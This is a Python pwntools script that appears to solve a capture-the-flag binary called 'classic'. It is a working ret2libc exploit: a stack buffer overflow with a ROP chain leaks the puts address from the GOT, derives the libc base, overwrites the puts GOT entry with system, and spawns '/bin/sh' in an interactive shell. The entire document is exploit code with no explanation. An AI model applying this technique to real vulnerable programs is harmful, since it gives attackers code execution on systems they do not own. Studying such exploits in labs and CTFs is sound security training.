#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *

target = process("./classic")
elf = ELF("./classic")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# address
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
gets_plt = elf.plt["gets"]

pop_rdi = ROP(elf).rdi[0]

libc_puts_off = libc.symbols["puts"]
libc_system_off = libc.symbols["system"]

print("[*] puts plt addr : 0x{:x}".format(puts_plt))
print("[*] puts got addr : 0x{:x}".format(puts_got))
print("[*] gets plt addr : 0x{:x}".format(gets_plt))
print("[*] pop rdi addr : 0x{:x}".format(pop_rdi))
print("[*] libc system offset : 0x{:x}".format(libc_system_off))
print("[*] libc puts offset : 0x{:x}".format(libc_puts_off))

# payload 
payload = b"A" * 72
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)

payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(gets_plt)

payload += p64(pop_rdi)
payload += p64(puts_got + 0x8)
payload += p64(puts_plt)
payload += b"B" * 8

_ = target.readuntil(">> ")
target.sendline(payload)
_ = target.readline()

temp = target.recvline()
print(temp)
libc_puts_addr = u64(temp[:-1] + b"\x00\x00")
print("[*] libc_puts_addr : 0x{:x}\n".format(libc_puts_addr))

libc_base_addr = libc_puts_addr - libc_puts_off

print("[*] libc_base_addr : 0x{:x}\n".format(libc_base_addr))

system_addr = libc_base_addr + libc_system_off

print("[*] system_addr : 0x{:x}\n".format(system_addr))

target.sendline(p64(system_addr) + b"/bin/sh\x00")


target.interactive()
